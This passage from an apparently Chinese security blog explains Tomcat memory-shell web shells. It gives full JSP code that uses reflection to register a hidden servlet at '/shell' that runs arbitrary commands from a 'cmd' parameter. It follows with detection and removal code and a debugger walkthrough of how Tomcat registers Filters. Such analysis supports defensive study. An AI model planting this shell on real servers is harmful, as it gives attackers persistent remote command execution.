class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(command == <span class="literal">null</span>)&#123;</span><br><span class="line">                command = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                stringBuffer.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(stringBuffer.toString());;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="type">ServletShell</span> <span class="variable">servletShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletShell</span>();</span><br><span class="line">    wrapper.setName(servletShell.getClass().getSimpleName());</span><br><span class="line">    wrapper.setServlet(servletShell);</span><br><span class="line">    wrapper.setServletClass(servletShell.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, servletShell.getClass().getSimpleName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="Tomcat-Servlet-型内存马查杀"><a href="#Tomcat-Servlet-型内存马查杀" class="headerlink" title="Tomcat-Servlet 型内存马查杀"></a>Tomcat-Servlet 型内存马查杀</h4><p>和Servlet相关的是<code>children</code>和<code>servletMappings</code>两个属性，这两个属性分别维护着Servlet的定义，以及Servlet的映射关系。在StandardContext中有removeChild()方法来删除指定的Wrapper：</p><p><img src="https://pic.imgdb.cn/item/64d26dce1ddac507cc04deeb.jpg"></p><p>org.apache.catalina.core.StandardContext#removeServletMapping方法通过指定的pattern删除Servlet映射。</p><p><img src="https://pic.imgdb.cn/item/64d26ddf1ddac507cc05078b.jpg" alt="image-20230808142716599"></p><p>有了这两个方法我们就可以删除掉指定的Servlet了。那我们该怎么知道哪些类是内存马需要被删除呢？有以下几种判断方法：</p><ul><li><p>判断该Class是否有对应的磁盘文件</p></li><li><p>dump Class字节码，反编译审计是否存在恶意代码</p></li><li><p>是否被可疑的ClassLoader所加载？</p></li><li><p>根据Class名及urlpattern判断</p></li></ul><p>以下给出查杀代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Container&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardContext</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">        <span class="keyword">return</span> standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, Container&gt; <span class="title function_">getChildren</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">childrenFiled</span> <span class="operator">=</span> standardContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">        childrenFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Container&gt; children = (HashMap&lt;String, Container&gt;) childrenFiled.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, String&gt; <span class="title function_">getServletMaps</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">servletMappingsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;servletMappings&quot;</span>);</span><br><span class="line">        servletMappingsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, String&gt; servletMappings = (HashMap&lt;String, String&gt;) servletMappingsField.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> servletMappings;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">classFileIsExists</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">classNamePath</span> <span class="operator">=</span> className.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> clazz.getClassLoader().getResource(classNamePath);</span><br><span class="line">        <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">deleteServlet</span><span class="params">(HttpServletRequest request, String servletName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;String, Container&gt; childs = getChildren(request);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objChild</span> <span class="operator">=</span> childs.get(servletName);</span><br><span class="line">        <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        HashMap&lt;String, String&gt; servletMaps = getServletMaps(request);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; servletMap : servletMaps.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (servletMap.getValue().equals(servletName)) &#123;</span><br><span class="line">                urlPattern = servletMap.getKey();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (urlPattern != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeServletMapping</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeServletMapping&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">            removeServletMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeServletMapping.invoke(standardContext, urlPattern);</span><br><span class="line">            <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeChild</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeChild&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;org.apache.catalina.Container.class&#125;);</span><br><span class="line">            removeChild.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeChild.invoke(standardContext, objChild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    HashMap&lt;String, Container&gt; children = getChildren(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappings = getServletMaps(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappingsCopy = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(servletMappings);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : servletMappingsCopy.entrySet())&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletMapPath</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">        <span class="type">StandardWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (StandardWrapper) children.get(servletName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">servletClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            servletClass = Class.forName(wrapper.getServletClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servlet</span> <span class="operator">=</span> wrapper.getServlet();</span><br><span class="line">            <span class="keyword">if</span> (servlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                servletClass = servlet.getClass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.write(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassName</span> <span class="operator">=</span> servletClass.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassLoaderName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                servletClassLoaderName = servletClass.getClassLoader().getClass().getName();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isMemoryShell(servletClassLoaderName, servletClass))&#123;</span><br><span class="line">                deleteServlet(request, servletName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>代码很容易理解，稍微解释一下吧。首先获取children属性和servletMappings属性，之后不断遍历servletMappings，获取ClassName以及ClassLoaderName，之后调用isMemoryShell函数判断是否为内存马，如果是内存马则删除，以下是isMemoryShell函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>判断逻辑很简单粗暴，判断是否是一个正常的ClassLoader以及该Class是否有对应的磁盘文件。</p><h3 id="Tomcat-Filter-型内存马"><a href="#Tomcat-Filter-型内存马" class="headerlink" title="Tomcat-Filter 型内存马"></a>Tomcat-Filter 型内存马</h3><h4 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h4><p>写一个简单的Filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;helloFIlter&quot;, urlPatterns = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;rainb0w&quot;</span>);;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把请求传回过滤链</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为我们是通过注解的方式添加了一个Filter，因此我们需要找一下该注解的处理位置，首先利用maven下载源代码，之后全局搜索：</p><p><img src="https://pic.imgdb.cn/item/64d26dec1ddac507cc052963.jpg"></p><p>进入后，发现<code>org.apache.catalina.startup.ContextConfig#processAnnotationWebFilter</code>是处理@WebFilter的函数：</p><p><img src="https://pic.imgdb.cn/item/64d26dfa1ddac507cc054e8a.jpg" alt="image-20230803140753347"></p><p>打下断点，跟进：</p><p><img src="https://pic.imgdb.cn/item/64d26e051ddac507cc056871.jpg" alt="image-20230803141110427"></p><p>可以看到，filterName的值为我们在注解中配置好的filterName。接着往下看：</p><p><img src="https://pic.imgdb.cn/item/64d26e0f1ddac507cc0583ab.jpg" alt="image-20230803141315613"></p><p>创建filterDef对象，设置了filterName和filterClass，其中filterClass是我们创建的FIlter的全限定名。之后遍历evps</p><p><img src="https://pic.imgdb.cn/item/64d26e191ddac507cc059dbc.jpg" alt="image-20230803141701994"></p><p>for 循环两次，<code>evp.getNameString()</code>获得的字符串结果有两个，一个是filterName，还有一个是urlPatterns，也就是我们在注解中配置那两个参数。当name变量被赋值urlPatterns时，进入if语句：</p><p><img src="https://pic.imgdb.cn/item/64d26e251ddac507cc05bb2a.jpg" alt="image-20230803143642794"></p><p>得到urlPatterns并遍历，将所有的urlPattern添加进filterMap中。继续跟进：</p><p><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803143853818"></p><p>可以看到，通过调用<code>addFilter()</code>和<code>addFilterMapping()</code>将<code>filterDef</code>和<code>filterMap</code>添加进<code>fragment</code>中。fragment是个webXml对象，里面存放着web的各种配置信息，会和web.xml读取出来的信息会进行合并。继续跟进，执行到如下代码：</p><p><img src="https://pic.imgdb.cn/item/64d26e2f1ddac507cc05d426.jpg" alt="image-20230803144420033"></p><p>又是<code>configureContext</code>函数，还记得我们上面在分析注册Servlet流程的时候也看到了这个函数吗？这里注释解释得也很清楚，此处是将合并后的web.xml应用于Context。进入configureContext函数，此处调用addFilterDef()和addFilterMap()方法，context同样是一个StandardContext对象：</p><p><img src="https://pic.imgdb.cn/item/64d26e461ddac507cc061134.jpg" alt="image-20230803144837194"></p><p>但是请注意，此时仍然完成自定义 Filter 的注册，因为并没有将这个 Filter 放到 FilterChain 中。之后我们在doFilter处打下断点，访问&#x2F;hello-servlet，看到调用栈：</p><p><img src="https://pic.imgdb.cn/item/64d26e561ddac507cc063bef.jpg" alt="image-20230803150533995"></p><p>发现在下图的位置<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>执行了<code>doFilter</code>：</p><p><img src="https://pic.imgdb.cn/item/64d26e621ddac507cc065b55.jpg" alt="image-20230803150726766"></p><p>可以看到filter是从filterConfig取出的，而filterConfig是从filters数组中的元素赋值得到的。那么ApplicationFilterChain是什么时候被创建的呢？它其中的filters字段又是什么时候被赋值的呢？继续看调用栈：</p><p><img src="https://pic.imgdb.cn/item/64d26e6c1ddac507cc067732.jpg" alt="image-20230803151021951"></p><p>向上回溯，可以看到下图的位置执行了filterChain.doFilter()，也正是因为这里的调用，我们创建的Filter中的doFilter得以执行：</p><p><img src="https://pic.imgdb.cn/item/64d26e791ddac507cc0697ef.jpg" alt="image-20230803151109791"></p><p>向上看，可以看到filterChain是通过ApplicationFilterFactory.createFilterChain()得到的。跟进org.apache.catalina.core.ApplicationFilterFactory#createFilterChain，打下断点，进行调试：</p><p><img src="https://pic.imgdb.cn/item/64d26e841ddac507cc06b4fd.jpg" alt="image-20230803152059321"></p><p><img src="https://pic.imgdb.cn/item/64d26e8f1ddac507cc06d27b.jpg" alt="image-20230803152124788"></p><p>取出StandardContext中的filterMaps并复制给filterMaps，可以看到filterMaps中有我们创建的Filter：</p><p><img src="https://pic.imgdb.cn/item/64d26e9b1ddac507cc06f156.jpg" alt="image-20230803152213935"></p><p>继续跟进：</p><p><img src="https://pic.imgdb.cn/item/65750a0dc458853aefefc0be.jpg" alt="image-20230803152213936"></p><p><img src="https://pic.imgdb.cn/item/64d26eee1ddac507cc07ccd3.jpg" alt="image-20230803152442214"></p><p>通过.addFilter()方法添加进从StandardContext中取出的filterConfig，并将其赋值给filterChain中的filters数组字段中的元素。至此，我们就已经完整地跟进了整个Filter的注册和doFilter的调用。</p><p>过程其实挺好理解，总结一下：</p><p>1.获取StandardContext：</p><p>2.创建FilterDef，通过addFilterDef()函数添加进StandardContext</p><p>3.创建ApplicationFilterConfig，通过反射拿到StandardContext的filterConfigs字段，并调用put()方法将ApplicationFilterConfig添加进StandardContext</p><p>3.创建FilterMap，通过addFilterMapBefore()函数添加进StandardContext。</p><h4 id="反序列化注入Tomcat-Filter-型内存马"><a href="#反序列化注入Tomcat-Filter-型内存马" class="headerlink" title="反序列化注入Tomcat-Filter 型内存马"></a>反序列化注入Tomcat-Filter 型内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 